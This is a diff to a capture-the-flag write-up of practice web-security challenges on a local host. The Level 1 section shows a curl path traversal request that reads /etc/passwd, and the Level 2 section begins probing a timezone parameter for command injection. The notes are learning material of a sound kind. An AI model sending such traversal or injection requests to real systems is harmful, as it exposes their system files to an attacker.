@@ -5,8 +5,10 @@
 
 
 ## Web-security level 1
-* After running the flag..
-* with curl we can hunt for the flag file...
+* In this challnage we have to perform Path traversal..
+* After running the file `/challange/run` we can perform the attack vector...
+* For flag we use Curl.. 
+
 
 ```sh
 hacker@web-security-level-1:~$ curl http://challenge.localhost:80/../../../etc/passwd --path-as-is -i
@@ -68,7 +70,22 @@ hacker@web-security-level-1:~$
 ```
 
 ## Web-security level 2
+
+* In this challange we have to get the flag via Command injection...
+
 ```sh
+# for a normal curl request it shows like shoem kind of timezone...
+
+hacker@web-security-level-2:~$ curl http://challenge.localhost:80
+Tue Apr 25 09:27:52 UTC 2023
+
+# after sometime i got know tha at this parameter this works very odd..
+
+hacker@web-security-level-2:~$ curl http://challenge.localhost:80?timezone=whoami
+Tue Apr 25 09:28:55 whoami 2023
+
+# After emum ... 
+
 
 ```
 ## Web-security level 3
